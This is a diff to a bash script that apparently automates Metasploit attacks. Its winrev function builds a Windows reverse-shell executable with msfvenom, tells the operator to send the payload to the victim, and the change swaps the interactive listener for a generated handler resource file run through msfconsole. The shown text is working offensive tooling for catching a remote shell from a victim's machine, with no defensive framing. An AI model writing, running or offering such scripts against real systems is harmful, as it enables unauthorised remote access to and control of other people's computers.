@@ -59,16 +59,14 @@ function winrev() {
 	msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT R> $DIR/payload.exe
 	printf "\e[1;31mSEND THE PAYLOAD TO THE VICTIM\e[0m \n"
 	#Activate listener for the winreverse payload
-	msfconsole
-	sleep 10s
-	printf "g"
 	EXPLOIT="exploit/multi/handler"
-	use $EXPLOIT
-	set payload $PAYLOAD
-	set LHOST $HOST
-	set LPORT $PORT
-	show options
-	run
+	touch /root/handler.rc
+	echo use $EXPLOIT >> /root/handler.rc
+	echo set payload $PAYLOAD >> /root/handler.rc
+	echo set LHOST $HOST >> /root/handler.rc
+	echo set LPORT $PORT >> /root/handler.rc
+	echo run >> /root/handler.rc
+	msfconsole -r /root/handler.rc
 }
 
 #Banner
